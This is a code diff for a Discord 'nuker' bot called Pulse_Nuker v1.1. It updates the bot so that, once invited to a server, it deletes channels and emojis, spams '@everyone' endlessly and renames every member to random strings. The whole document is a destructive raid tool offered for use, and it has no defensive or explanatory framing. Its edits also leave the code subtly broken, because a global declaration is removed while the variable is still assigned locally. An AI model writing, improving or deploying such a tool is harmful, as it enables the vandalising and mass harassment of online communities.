@@ -10,17 +10,16 @@ def randomletters(length):
     return ''.join(random.choice(letters) for i in range(length))
 
 TOKEN = ("")
+TEST = 0
 
 client=discord.Client(intents=discord.Intents.all())
 
 
 @client.event
 async def on_ready():
-    print('connected to Discord!')
-    global TEST
-    t = 0
-    TEST = t
-    return await client.change_presence(activity=discord.Game(name='Pulse_Nuker'))
+    print("Pulse_Nuker v1.1 is running.\nInvite your bot and send any message to start nuke.\n\n")
+    print("WARNING!!\nYou may get API Timeout from Discord server if you nuke long.\nPlease Use wisely.")
+    return await client.change_presence(activity=discord.Game(name='Pulse_Nuker v1.1'))
     
     
 '''
@@ -32,9 +31,7 @@ async def on_member_ban(guild,user):
 
 
 @client.event
-
 async def on_message(message):
-    global TEST
     if TEST == 0:
         TEST = 1
         for c in message.guild.channels: 
@@ -51,11 +48,10 @@ async def on_message(message):
                 pass
         for Emoji in message.guild.emojis:
             await Emoji.delete()
-    response = '@everyone'
     
+    response = '@everyone' #You can add some messages via editing this string
     
     while True:
-        
         print("message sent "+random.choice(string.ascii_letters))
         try:
             await message.channel.send(response)
@@ -63,8 +59,8 @@ async def on_message(message):
             print("message error")
             pass
         try:
-            user=message.author
-            await user.edit(nick=randomletters(3))
+            for user in message.guild.members:
+                await user.edit(nick=randomletters(3))
         except:
             print("can't change user nick")
             pass
